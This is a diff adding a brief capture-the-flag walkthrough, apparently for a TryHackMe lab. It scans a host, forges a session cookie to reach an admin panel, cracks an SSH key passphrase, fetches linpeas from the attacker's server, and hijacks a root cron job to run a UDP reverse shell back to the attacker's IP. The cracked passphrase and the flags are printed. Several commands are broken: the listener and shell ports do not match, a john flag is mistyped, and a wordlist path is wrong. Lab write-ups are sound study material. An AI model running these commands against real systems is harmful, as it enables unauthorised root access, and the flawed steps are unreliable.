@@ -1,0 +1,43 @@
+@scan all port
+nmap -sC -sV 10.10.220.197
+@there are open ports 80/tcp, 21/tcp
+@brutef-orce urls including directories and files
+gobuster dir -u http://10.10.220.197 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
+@analyse login.js and see straing row - Cookies.set("SessionToken",statusOrCookie)
+#set cookie manually in the console browser to become admin
+Cookies.set("SessionToken",)
+@after refresh page, show admin panel where there is rsa private key
+@crack passphare of id_rsa
+ssh2john id_rsa.txt id_rsa.hash
+john --wordlists=/usr/share/wordlists/dirb/rockyou.txt id_rsa.hash
+@i find passphrase "james13"
+@ssh connection with rsa_id and passphrase
+ssh -i id_rsa.txt james@10.10.220.197
+ls -la
+@there is user.txt, that normally have user flag
+cat user.txt
+#I find thm{65c1aaf000506e56996822c6281e6bf7}
+@now use linpeas script to find all system vulnerability
+@on host machine start http python server
+python3 -m http.server
+@on the victim download script
+wget http://10.9.215.42/linpeas.sh
+@execute the script
+bash linpeas.sh
+@these is cronjob esecute as root every second on overpass.thm host
+@change hosts on host machine
+nano /etc/hosts
+@and insert the row to became malicius server that victim download and execute file
+10.9.215.42 overpass.thm
+@create fake dir /downloads/src and insert UDP reverse shell
+echo "sh -i >& /dev/udp/10.9.215.42/4444 0>&1" > buildscript.sh
+@start http python server in / folder of /downloads/src
+python3 -m http.server 80
+@open port listener
+nc -u -lvp 4242
+@wait few minutes than victim download reverse shell from /download/src and execute it
+@now have root shell
+ls -la
+@there is root.txt, that normally have root flag
+cat root.txt
+#I find thm{7f336f8c359dbac18d54fdd64ea753bb}
